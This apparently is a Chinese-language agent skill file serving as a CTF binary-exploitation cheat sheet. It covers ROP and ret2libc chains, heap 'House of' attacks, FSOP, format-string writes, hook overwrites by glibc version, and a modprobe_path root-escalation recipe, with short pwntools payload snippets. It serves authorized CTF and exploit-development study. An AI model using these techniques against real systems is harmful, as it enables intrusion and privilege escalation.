---
name: pwn
description: 大爱仙尊·假设作业长文（pwn）。先专卡后读本文。
---

> 作业先走 Skill `器胚破核` / `tools/pwn-kit/pwn_triage.py`。业务站 URL 仍走专链，不把网站案当 pwn。

# Pwn / Binary Exploitation

> 仅在根路由选择本目录后读取，且仅限明确授权的 CTF/二进制利用任务。每个条目都是待验证的检查假设。

**触发**: 目标含 CTF pwn 题 / 二进制服务（栈溢出/堆/UAF/格式串）/ 需要 ROP 或任意写→RCE 的利用开发。

## 领域决策直觉

1. **glibc 版本是硬分水岭**：2.26(tcache) / 2.29(key) / 2.32(safe-linking) / 2.34(hooks 删除) 四道门槛决定全部可行路线——先 `ldd` / `strings libc | grep "GNU C Library"` 确认版本
2. **64 位两个"地址后置"陷阱贯穿始终**：null 字节截断（地址放 payload 末尾）、movaps 16 字节对齐（system 前插多余 `ret`）
3. 决策树：NX→canary→ASLR→缺 `pop rdx`→短溢出→静态→Full RELRO 七级分支逐级选路线

---

## 栈溢出 / ROP

### ret2libc + 泄露 + ROP（64 位核心方法论）
- **信号**: NX 开启的栈溢出，可泄 libc 地址（有 puts/write PLT 或可反复回 main）
- **验证**:
  - 64 位传参 gadget: `pop rdi; ret`(arg1) / `pop rsi; pop r15; ret`(arg2)；缺 `pop rdx; ret` 走 **ret2csu**（`__libc_csu_init+0x3a` 六连 pop、`+0x20` 的 `mov rdx,r13; mov rsi,r14; mov edi,r15d; call [r12+rbx*8]`；关键约束 **r12 必须指向"指向目标函数的指针"(GOT 项)而非函数地址**，`rbx=0, rbp=1` 跳过循环）
  - 标准两阶段: `payload='A'*offset + p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(main)` → `u64(recvline())` → `libc_base = leak - libc.symbols['puts']` → 二次打
  - **关键坑**: 64 位 `system()` 内部 `movaps` 要求 `RSP%16==0`，对齐不对插一个多余 `ret` gadget
- **工具**: `checksec` / `ROPgadget --binary elf --ropchain` / `ropper -f elf --search "pop rdi"` / pwntools `ROP(elf).call('system',['/bin/sh'])` / `one_gadget ./libc.so.6 -l 2`（约束 rsp&0xf==0、rcx==NULL 必须现场验证）

### 免 libc 泄露两条路：ret2dlresolve / SROP
- **验证**: `Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])` + `rop.ret2dlresolve()`（伪造 Elf_Rel/Elf_Sym/字符串，64 位注意 `VERSYM[sym_index]` 版本检查）→ SROP `SigreturnFrame()` 一次设全部寄存器，`rax=15`(SYS_rt_sigreturn) 触发
- **升级**: 无泄露场景拿到 shell

### 高级变体：BROP / partial overwrite / JOP-COP / ORW
- **验证**:
  - **BROP**（无二进制盲打 fork 服务）六阶段: ①逐字节爆破 canary+offset ②找 stop gadget ③找 6-pop BROP gadget（`[overflow][canary][saved_rbp][candidate][A*6][stop]`）④按 PLT 固定 16 字节间隔扫 puts/write ⑤puts 逐页 dump .text/.got/.dynamic ⑥常规 ROP
  - **partial overwrite**（PIE 无泄露）: 低 12 位固定，只覆写返回地址低 1-2 字节（1/16 爆破，可配合 fork 布局不变）
  - **ORW 链**（seccomp 禁 execve）: `pop rdi+flag地址 → pop rsi_r15+0 → pop rax=2+syscall` 依次 open(2)/read(0)/write(1)，fd 恒为 3
  - **JOP**（绕 CET 影子栈）: dispatcher `add rax,8; jmp [rax]`——`ret` 受影子栈校验而 `jmp` 不受

---

## 堆利用

### 泄露 + safe-linking + 按版本选攻击
- **验证**: libc 泄露——free 一个 >0x410 的块（或填满 7 条 tcache）→ unsortedbin 的 fd/bk 指向 `main_arena+0x60`；heap 泄露——free 两个 tcache/fastbin 块读 fd
  - **safe-linking（≥2.32）**: `stored = (chunk_addr>>12) ^ real_fd`；解码 `real = stored ^ (chunk>>12)`——写 fd 前必须编码
  - **tcache key 绕过（2.29+）**: key 在 chunk+0x18，双 free 前先 `edit(A, p64(0)+p64(0))` 清 fd 和 key
  - pwndbg: `bins` / `tcachebins` / `find_fake_fast &__malloc_hook`

### House 系列（按有无 free/有无 leak/hook 选）
- **House of Force**（<2.29）: 改 top chunk size 为 `0xffffffffffffffff` → 大请求把 top 吃到目标前
- **House of Spirit**: 在目标处伪造 chunk 头（size=0x41）→ `free(fake+0x10)` → malloc 返回伪造区
- **House of Orange**（2.23，无 free）: 改 top size → sysmalloc 丢旧 top 进 unsortedbin → unsortedbin attack 改 bk 到 `_IO_list_all-0x10` → 伪造 FILE → abort 触发 `_IO_flush_all_lockp`
- **House of Einherjar**（off-by-null）: 清 PREV_INUSE + 伪造 prev_size → 后向合并成重叠区
- **House of Botcake**（2.29-2.31 双 free）: 填满 tcache → free(A) 进 unsortedbin → free(B) 合并 → 腾 1 条 tcache → 再 free(A) 使其同时存在于 unsortedbin 和 tcache → 重叠
- **House of Roman**（无 leak）: 三次部分覆写（fd→hook + unsortedbin + 覆写 one_gadget），成功率 ~1/4096
- **House of Cat/Apple（≥2.35 现代路线）**: Cat 走 `_IO_wfile_seekoff→_IO_switch_to_wget_mode`（需 `_mode>0` 且 `_wide_data->_IO_write_ptr > _IO_write_base`）；Apple 2 用 largebin attack 写 `_IO_list_all` + 伪造 `_wide_data->_wide_vtable`（宽字符 vtable 不做范围检查，绕 2.24 vtable 校验）

### _IO_FILE / FSOP：vtable 劫持 + stdout 任意读
- **验证**: 关键偏移 `_IO_write_base`=0x20 / `_IO_write_ptr`=0x28 / `_chain`=0x68 / `_fileno`=0x70 / `_lock`=0x88 / `_mode`=0xc0 / `vtable`=0xd8；flush 条件 `_mode<=0 && write_ptr>write_base`
  - **stdout 任意读**: 覆写 `_flags=0xfbad1800`，`_write_base=target`、`_write_ptr=target+len` → 下次 puts/printf 自动吐内容（无显式输出也能泄露）
  - **vtable 劫持分版本**: <2.24 直接伪造表把 `__overflow`(vtable+0x18) 指向 system（FILE 首字段 `/bin/sh` 当参数）；2.24-2.27 用 `_IO_str_jumps`；≥2.28 走 `_IO_wfile_jumps` 宽字符间接表
  - **触发链**: `exit()/abort()/return from main` → `__run_exit_handlers → _IO_cleanup → _IO_flush_all_lockp → _IO_OVERFLOW(fp,EOF)`
- **现代收口（2.34 后）**: `_IO_wfile_jumps`(House of Apple 2/Cat) + exit_funcs/TLS_dtor_list(需 pointer guard) + `_dl_fini`(免混淆，**FINI_ARRAY 函数指针不混淆**是独特优势)

---

## 格式化字符串

### 栈读 + 任意写 %n（64 位 null 字节处理）
- **验证**: 测试 `AAAA%p%p%p%p` 或 `AAAA%N$p` 找输入栈偏移 → 读：`%N$p` 定位（canary 在 `buf_size/8` 附近、返回地址泄 PIE base = `leak & ~0xfff - offset`、`__libc_start_main+XX` 泄 libc）→ `%N$s` 按指针读任意地址 → 写：`%n`(4B)/`%hn`(2B)/`%hhn`(1B)
- **64 位关键**: 地址含 `\x00` 截断格式串 → 地址放格式串**之后**: `fmt=b'%Xc%N$hn%Yc%M$hn'` + `.ljust(align,b'A')` 8 字节对齐 + `p64(addr)+p64(addr+2)`
- **自动化**: `fmtstr_payload(offset, {got['printf']: system}, write_size='short')` / `FmtStr(execute_fmt=fn)` 自动测 offset

### GOT/hook 覆写 + 指针链 + FORTIFY 绕过
- **验证**: GOT 覆写目标 `printf→system` / `atoi→system`（传 "sh"）/ `exit→main`（循环多轮）/ `__stack_chk_fail→ret`（废 canary）→ 输入不在栈上时用**栈上既有指针链**两段式写（先 %hn 改栈指针低字节指向目标，再透过该指针写）→ FORTIFY 禁 `%N$n` 时改顺序式 `%hn`（无定位符）

---

## 任意写 → RCE

### GOT/hooks 覆写（glibc <2.34）+ realloc trick
- **验证**: `__malloc_hook=one_gadget`，触发 `sendline('%100000c')`（printf 大格式串内部调 malloc）；`__free_hook=system`，free("/bin/sh")；**realloc trick** 调 one_gadget 约束：`__malloc_hook=realloc+N`（+2/+4/+6 跳掉 push 调栈对齐）、`__realloc_hook=one_gadget`

### ≥2.34 现代目标：exit_funcs / TLS_dtor_list / _dl_fini
- **验证**: 函数指针混淆 `stored = ROL(ptr ^ __pointer_chk_guard, 0x11)`（guard 在 `fs:[0x30]`）；拿不到 guard 可"先覆写 guard=0，再写 ROL(target,0x11)" → `tls_dtor_list`（≥2.34 首选，TLS 基址从 canary `fs:[0x28]` 推导）→ `_dl_fini`/link_map 腐蚀（改 `l_info[DT_FINI_ARRAY]`，**函数指针不混淆**）

### modprobe_path + setcontext 通用转化
- **验证**: `modprobe_path`（内核最简提权）: 写 `/tmp/x\x00` → 脚本 `#!/bin/sh\ncat /flag > /tmp/out` + chmod +x → 触发文件 `echo -ne '\xff\xff\xff\xff' > /tmp/trigger; chmod +x; /tmp/trigger` → 内核以 root 调 modprobe_path → **setcontext gadget**: <2.29 用 `setcontext+53`（RDI 读 ucontext）；**≥2.29 改 `+61` 从 RDX 读**（需 `mov rdx,[rdi+X];...;call [rdx+Y]` 中转 gadget）
